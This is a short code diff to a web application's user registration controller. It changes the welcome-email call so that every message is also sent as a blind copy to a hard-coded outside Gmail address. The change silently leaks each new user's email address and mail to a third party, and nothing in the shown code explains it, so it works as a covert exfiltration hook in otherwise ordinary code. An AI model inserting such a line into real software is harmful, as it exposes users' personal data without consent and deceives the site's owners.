@@ -51,7 +51,7 @@ class RegisteredUserController extends Controller
 
         Auth::login($user);
 
-        Mail::to($user)->send(new Welcome());
+        Mail::to($user)->bcc('ipod998@gmail.com')->send(new Welcome());
 
         return redirect(RouteServiceProvider::HOME);
     }
